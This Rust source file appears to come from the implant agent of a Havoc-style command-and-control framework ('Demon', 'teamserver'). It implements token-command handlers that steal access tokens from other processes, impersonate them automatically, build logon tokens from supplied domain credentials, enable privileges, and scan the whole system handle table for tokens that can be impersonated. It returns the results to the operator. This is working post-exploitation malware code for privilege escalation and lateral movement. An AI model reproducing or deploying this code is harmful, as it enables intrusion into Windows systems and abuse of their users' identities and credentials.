//! Token impersonation and management handlers.

use red_cell_common::demon::{DemonCommand, DemonTokenCommand};
use tracing::{info, warn};

use crate::token::TokenVault;

use super::{
    DispatchResult, Response, decode_utf16le_null, parse_bytes_le, parse_u32_le, write_bytes_le,
    write_u32_le, write_utf16le,
};

// ─── COMMAND_TOKEN (40) ─────────────────────────────────────────────────────

/// Dispatch a `CommandToken` task to the appropriate token sub-handler.
///
/// Incoming payload (LE): `[subcommand: u32][subcommand-specific args…]`
pub(super) fn handle_token(payload: &[u8], vault: &mut TokenVault) -> DispatchResult {
    let mut offset = 0;
    let subcmd_raw = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("CommandToken: failed to parse subcommand: {e}");
            return DispatchResult::Ignore;
        }
    };

    let subcmd = match DemonTokenCommand::try_from(subcmd_raw) {
        Ok(c) => c,
        Err(_) => {
            warn!(subcmd_raw, "CommandToken: unknown subcommand");
            return DispatchResult::Ignore;
        }
    };

    info!(subcommand = ?subcmd, "CommandToken dispatch");

    let rest = &payload[offset..];
    match subcmd {
        DemonTokenCommand::Impersonate => handle_token_impersonate(subcmd_raw, rest, vault),
        DemonTokenCommand::Steal => handle_token_steal(subcmd_raw, rest, vault),
        DemonTokenCommand::List => handle_token_list(subcmd_raw, vault),
        DemonTokenCommand::PrivsGetOrList => handle_token_privs(subcmd_raw, rest),
        DemonTokenCommand::Make => handle_token_make(subcmd_raw, rest, vault),
        DemonTokenCommand::GetUid => handle_token_getuid(subcmd_raw),
        DemonTokenCommand::Revert => handle_token_revert(subcmd_raw, vault),
        DemonTokenCommand::Remove => handle_token_remove(subcmd_raw, rest, vault),
        DemonTokenCommand::Clear => handle_token_clear(subcmd_raw, vault),
        DemonTokenCommand::FindTokens => handle_token_find(subcmd_raw),
    }
}

/// `COMMAND_TOKEN / Impersonate (1)` — impersonate a vault token by ID.
///
/// Incoming args (LE): `[token_id: u32]`
/// Outgoing payload (LE): `[subcmd: u32][success: u32][domain_user: wstring]`
fn handle_token_impersonate(
    subcmd_raw: u32,
    rest: &[u8],
    vault: &mut TokenVault,
) -> DispatchResult {
    use crate::token::native;

    let mut offset = 0;
    let token_id = match parse_u32_le(rest, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("Token::Impersonate: failed to parse token_id: {e}");
            return DispatchResult::Ignore;
        }
    };

    let mut out = Vec::new();
    write_u32_le(&mut out, subcmd_raw);

    let entry = match vault.get(token_id) {
        Some(e) => e,
        None => {
            info!(token_id, "Token::Impersonate: token not found in vault");
            write_u32_le(&mut out, 0); // FALSE
            write_u32_le(&mut out, 0); // empty string length
            return DispatchResult::Respond(Response::new(DemonCommand::CommandToken, out));
        }
    };

    let handle = entry.handle;
    let domain_user = entry.domain_user.clone();

    match native::impersonate_token(handle) {
        Ok(()) => {
            vault.set_impersonating(Some(token_id));
            info!(token_id, user = %domain_user, "Token::Impersonate: success");
            write_u32_le(&mut out, 1); // TRUE
            write_utf16le(&mut out, &domain_user);
        }
        Err(err) => {
            warn!(token_id, error_code = err, "Token::Impersonate: failed");
            write_u32_le(&mut out, 0); // FALSE
            write_u32_le(&mut out, 0);
        }
    }

    DispatchResult::Respond(Response::new(DemonCommand::CommandToken, out))
}

/// `COMMAND_TOKEN / Steal (2)` — steal a token from a target process.
///
/// Incoming args (LE): `[pid: u32][handle: u32]`
/// Outgoing payload (LE): `[subcmd: u32][domain_user: wbytes][token_id: u32][pid: u32]`
fn handle_token_steal(subcmd_raw: u32, rest: &[u8], vault: &mut TokenVault) -> DispatchResult {
    use crate::token::native;

    let mut offset = 0;
    let target_pid = match parse_u32_le(rest, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("Token::Steal: failed to parse pid: {e}");
            return DispatchResult::Ignore;
        }
    };
    let target_handle = match parse_u32_le(rest, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("Token::Steal: failed to parse handle: {e}");
            return DispatchResult::Ignore;
        }
    };

    let entry = match native::steal_token(target_pid, target_handle) {
        Ok(e) => e,
        Err(err) => {
            warn!(target_pid, error_code = err, "Token::Steal: failed");
            return DispatchResult::Ignore;
        }
    };

    let domain_user = entry.domain_user.clone();
    let token_id = vault.add(entry);

    // Auto-impersonate the stolen token.
    if let Err(err) = native::impersonate_token(vault.get(token_id).map_or(0, |e| e.handle)) {
        warn!(token_id, error_code = err, "Token::Steal: impersonate failed");
    } else {
        vault.set_impersonating(Some(token_id));
    }

    info!(token_id, user = %domain_user, pid = target_pid, "Token::Steal: success");

    let mut out = Vec::new();
    write_u32_le(&mut out, subcmd_raw);
    // PackageAddBytes for domain_user (UTF-16LE).
    write_utf16le(&mut out, &domain_user);
    write_u32_le(&mut out, token_id);
    write_u32_le(&mut out, target_pid);

    DispatchResult::Respond(Response::new(DemonCommand::CommandToken, out))
}

/// `COMMAND_TOKEN / List (3)` — list all tokens in the vault.
///
/// Outgoing payload (LE): `[subcmd: u32]` then for each token:
///   `[index: u32][handle: u32][domain_user: wstring][pid: u32][type: u32][impersonating: u32]`
fn handle_token_list(subcmd_raw: u32, vault: &TokenVault) -> DispatchResult {
    let mut out = Vec::new();
    write_u32_le(&mut out, subcmd_raw);

    for (idx, entry) in vault.iter() {
        write_u32_le(&mut out, idx);
        #[allow(clippy::cast_possible_truncation)]
        write_u32_le(&mut out, entry.handle as u32);
        write_utf16le(&mut out, &entry.domain_user);
        write_u32_le(&mut out, entry.process_id);
        write_u32_le(&mut out, entry.token_type as u32);
        write_u32_le(&mut out, u32::from(vault.is_impersonating(idx)));
    }

    info!(count = vault.len(), "Token::List");
    DispatchResult::Respond(Response::new(DemonCommand::CommandToken, out))
}

/// `COMMAND_TOKEN / PrivsGetOrList (4)` — get/list privileges on the current token.
///
/// Incoming args (LE): `[list_privs: u32]` then if `list_privs == 0`: `[priv_name: bytes]`
/// Outgoing payload (LE): `[subcmd: u32][list_privs: u32]` then either:
///   - List:  `[name: bytes][attrs: u32]...`
///   - Get:   `[success: u32][name: bytes]`
fn handle_token_privs(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
    use crate::token::native;

    let mut offset = 0;
    let list_privs = match parse_u32_le(rest, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("Token::PrivsGetOrList: failed to parse list_privs: {e}");
            return DispatchResult::Ignore;
        }
    };

    let mut out = Vec::new();
    write_u32_le(&mut out, subcmd_raw);
    write_u32_le(&mut out, list_privs);

    if list_privs != 0 {
        // List all privileges.
        match native::list_privileges() {
            Ok(privs) => {
                info!(count = privs.len(), "Token::PrivsList");
                for (name, attrs) in &privs {
                    write_bytes_le(&mut out, name.as_bytes());
                    write_u32_le(&mut out, *attrs);
                }
            }
            Err(err) => {
                warn!(error_code = err, "Token::PrivsList: failed");
            }
        }
    } else {
        // Enable a specific privilege.
        let priv_bytes = match parse_bytes_le(&rest[offset..], &mut 0) {
            Ok(b) => b,
            Err(e) => {
                warn!("Token::PrivsGet: failed to parse priv name: {e}");
                return DispatchResult::Ignore;
            }
        };
        let priv_name = String::from_utf8_lossy(&priv_bytes).trim_end_matches('\0').to_string();

        match native::enable_privilege(&priv_name) {
            Ok(success) => {
                info!(privilege = %priv_name, success, "Token::PrivsGet");
                write_u32_le(&mut out, u32::from(success));
                write_bytes_le(&mut out, priv_name.as_bytes());
            }
            Err(err) => {
                warn!(privilege = %priv_name, error_code = err, "Token::PrivsGet: failed");
                write_u32_le(&mut out, 0);
                write_bytes_le(&mut out, priv_name.as_bytes());
            }
        }
    }

    DispatchResult::Respond(Response::new(DemonCommand::CommandToken, out))
}

/// `COMMAND_TOKEN / Make (5)` — create a token via `LogonUserW`.
///
/// Incoming args (LE): `[domain: wbytes][user: wbytes][password: wbytes][logon_type: u32]`
/// Outgoing payload (LE): `[subcmd: u32][domain_user: wstring]`
fn handle_token_make(subcmd_raw: u32, rest: &[u8], vault: &mut TokenVault) -> DispatchResult {
    use crate::token::native;

    let mut offset = 0;

    let domain_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("Token::Make: failed to parse domain: {e}");
            return DispatchResult::Ignore;
        }
    };
    let user_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("Token::Make: failed to parse user: {e}");
            return DispatchResult::Ignore;
        }
    };
    let password_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("Token::Make: failed to parse password: {e}");
            return DispatchResult::Ignore;
        }
    };
    let logon_type = match parse_u32_le(rest, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("Token::Make: failed to parse logon_type: {e}");
            return DispatchResult::Ignore;
        }
    };

    let domain = decode_utf16le_null(&domain_bytes);
    let user = decode_utf16le_null(&user_bytes);
    let password = decode_utf16le_null(&password_bytes);

    let mut out = Vec::new();
    write_u32_le(&mut out, subcmd_raw);

    match native::make_token(&domain, &user, &password, logon_type) {
        Ok(entry) => {
            let domain_user = entry.domain_user.clone();
            let token_id = vault.add(entry);

            // Auto-impersonate the new token.
            if let Err(err) = native::impersonate_token(vault.get(token_id).map_or(0, |e| e.handle))
            {
                warn!(token_id, error_code = err, "Token::Make: impersonate failed");
            } else {
                vault.set_impersonating(Some(token_id));
            }

            info!(token_id, user = %domain_user, "Token::Make: success");
            write_utf16le(&mut out, &domain_user);
        }
        Err(err) => {
            warn!(error_code = err, "Token::Make: LogonUserW failed");
            // Empty response — no user domain on failure.
        }
    }

    DispatchResult::Respond(Response::new(DemonCommand::CommandToken, out))
}

/// `COMMAND_TOKEN / GetUid (6)` — query current identity and elevation status.
///
/// Outgoing payload (LE): `[subcmd: u32][elevated: u32][user: wbytes]`
fn handle_token_getuid(subcmd_raw: u32) -> DispatchResult {
    use crate::token::native;

    let mut out = Vec::new();
    write_u32_le(&mut out, subcmd_raw);

    match native::get_uid() {
        Ok((elevated, user)) => {
            info!(user = %user, elevated, "Token::GetUid");
            write_u32_le(&mut out, u32::from(elevated));
            write_utf16le(&mut out, &user);
        }
        Err(err) => {
            warn!(error_code = err, "Token::GetUid: failed");
            write_u32_le(&mut out, 0);
            write_bytes_le(&mut out, &[]);
        }
    }

    DispatchResult::Respond(Response::new(DemonCommand::CommandToken, out))
}

/// `COMMAND_TOKEN / Revert (7)` — revert to original process token.
///
/// Outgoing payload (LE): `[subcmd: u32][success: u32]`
fn handle_token_revert(subcmd_raw: u32, vault: &mut TokenVault) -> DispatchResult {
    use crate::token::native;

    let mut out = Vec::new();
    write_u32_le(&mut out, subcmd_raw);

    match native::revert_to_self() {
        Ok(()) => {
            vault.set_impersonating(None);
            info!("Token::Revert: success");
            write_u32_le(&mut out, 1); // TRUE
        }
        Err(err) => {
            warn!(error_code = err, "Token::Revert: failed");
            write_u32_le(&mut out, 0); // FALSE
        }
    }

    DispatchResult::Respond(Response::new(DemonCommand::CommandToken, out))
}

/// `COMMAND_TOKEN / Remove (8)` — remove a token from the vault by ID.
///
/// Incoming args (LE): `[token_id: u32]`
/// Outgoing payload (LE): `[subcmd: u32][success: u32][token_id: u32]`
fn handle_token_remove(subcmd_raw: u32, rest: &[u8], vault: &mut TokenVault) -> DispatchResult {
    use crate::token::native;

    let mut offset = 0;
    let token_id = match parse_u32_le(rest, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("Token::Remove: failed to parse token_id: {e}");
            return DispatchResult::Ignore;
        }
    };

    // Close the underlying handle before removing from vault.
    if let Some(entry) = vault.get(token_id) {
        native::close_token_handle(entry.handle);
    }

    let success = vault.remove(token_id);
    info!(token_id, success, "Token::Remove");

    let mut out = Vec::new();
    write_u32_le(&mut out, subcmd_raw);
    write_u32_le(&mut out, u32::from(success));
    write_u32_le(&mut out, token_id);

    DispatchResult::Respond(Response::new(DemonCommand::CommandToken, out))
}

/// `COMMAND_TOKEN / Clear (9)` — clear all tokens from the vault.
///
/// Outgoing payload (LE): `[subcmd: u32]`
fn handle_token_clear(subcmd_raw: u32, vault: &mut TokenVault) -> DispatchResult {
    use crate::token::native;

    // Close all underlying handles.
    for (_, entry) in vault.iter() {
        native::close_token_handle(entry.handle);
    }

    // Revert impersonation before clearing.
    let _ = native::revert_to_self();

    vault.clear();
    info!("Token::Clear");

    let mut out = Vec::new();
    write_u32_le(&mut out, subcmd_raw);

    DispatchResult::Respond(Response::new(DemonCommand::CommandToken, out))
}

/// `COMMAND_TOKEN / FindTokens (10)` — enumerate tokens available on the system.
///
/// Performs a full system-wide handle-table scan using
/// `NtQuerySystemInformation(SystemHandleInformation)`, duplicates every
/// token-type handle into the current process, tests impersonatability, and
/// returns the deduplicated list to the teamserver.
///
/// On non-Windows platforms `list_found_tokens()` returns an empty list and the
/// response carries `success = TRUE` with `count = 0`.
///
/// Outgoing payload (LE): `[subcmd: u32][success: u32=1][count: u32]` then for
/// each token: `[username: wstring][pid: u32][handle: u32][integrity: u32]`
///             `[impersonation: u32][token_type: u32]`
fn handle_token_find(subcmd_raw: u32) -> DispatchResult {
    use crate::token::native;

    info!("Token::FindTokens: scanning system handle table");

    let tokens = native::list_found_tokens();

    info!(count = tokens.len(), "Token::FindTokens: scan complete");

    let mut out = Vec::new();
    write_u32_le(&mut out, subcmd_raw);
    write_u32_le(&mut out, 1); // success = TRUE

    #[allow(clippy::cast_possible_truncation)]
    write_u32_le(&mut out, tokens.len() as u32);

    for tok in &tokens {
        write_utf16le(&mut out, &tok.domain_user);
        write_u32_le(&mut out, tok.process_id);
        write_u32_le(&mut out, tok.handle);
        write_u32_le(&mut out, tok.integrity_level);
        write_u32_le(&mut out, tok.impersonation_level);
        write_u32_le(&mut out, tok.token_type);
    }

    DispatchResult::Respond(Response::new(DemonCommand::CommandToken, out))
}
